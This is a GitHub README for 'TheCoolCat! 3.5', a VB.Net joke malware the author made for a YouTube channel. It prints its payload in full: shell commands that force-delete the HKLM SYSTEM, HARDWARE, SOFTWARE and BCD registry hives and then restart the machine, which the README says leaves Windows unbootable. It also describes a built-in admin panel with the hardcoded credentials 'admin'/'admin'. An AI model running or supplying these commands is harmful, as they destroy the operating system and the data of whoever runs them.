<div>
  <img src="https://github.com/adrianvic/TheCoolCat-3.5/assets/85490958/e67251e6-2ad0-4b8e-9386-ca1011694a9c" title="Haruma" alt="Haruma" width="100" height="100" align="left"/>
  <h1>TheCoolCat!</h1>
</div>

TheCoolCat! is basically a **malware** that I made for my (old) [malware](https://www.youtube.com/@pisica_obraznica) channel.

![image](https://github.com/adrianvic/TheCoolCat-3.5/assets/85490958/2b3e0fba-5fd7-455e-8f1b-94652f69197c)


## What it does
It just deletes the windows registry and shows messageboxes until your computer crash or restart with the shutdown command

## How it works
I made it in jan 2022 (wow it's ~2 years old) and I was very dumb with programming, so I made it in VB.Net for convenience and just executed some CMD commands for the payload
> Shell("cmd.exe /c reg delete HKLM\SYSTEM /f")
> 
> Shell("cmd.exe /c reg delete HKLM\HARDWARE /f")
>
> Shell("cmd.exe /c reg delete HKLM\SOFTWARE /f")
>
> Shell("cmd.exe /c reg delete HKLM\BCD00000000 /f")
>
> Shell("cmd.exe /c shutdown -r -t 20")
>
> MessageBox.Show("", "", MessageBoxButtons.AbortRetryIgnore)

## What happens after restarting
An infinite "Diagnosing your PC"
<div>
  <img src="https://github.com/adrianvic/TheCoolCat-3.5/assets/85490958/4c35c0a3-481c-4319-9fae-77ac9d887179" title="Error" alt="Error" width="500" height="250" align="center"/>
</div>

## Can I recover a PC after the payload?
If you have a backup of your registry, otherwize your best move is reinstall Windows. But if you ran it and want to close, you can always force close on the admin panel by clicking on the secret link and putting the user and password "admin":

![image](https://github.com/adrianvic/TheCoolCat-3.5/assets/85490958/6a5f1da8-0391-4fdd-98a3-1603b406cc1d)

![image](https://github.com/adrianvic/TheCoolCat-3.5/assets/85490958/f7ca9249-2cb3-4cdf-a08e-b68a49c113a5)


## Why it's TheCoolCat 3.5?
It has 3 versions: version 1.0 & 2.0 are shown on my video, but this is the third version, with nothing really new but an acceptable interface

## HEY YOUR IDIOT MY PC DOESN'T BOOT ANYMORE DO SOMETHING
![image](https://github.com/adrianvic/TheCoolCat-3.5/assets/85490958/657922b3-ae0a-4f50-8878-117717b49101)

No?
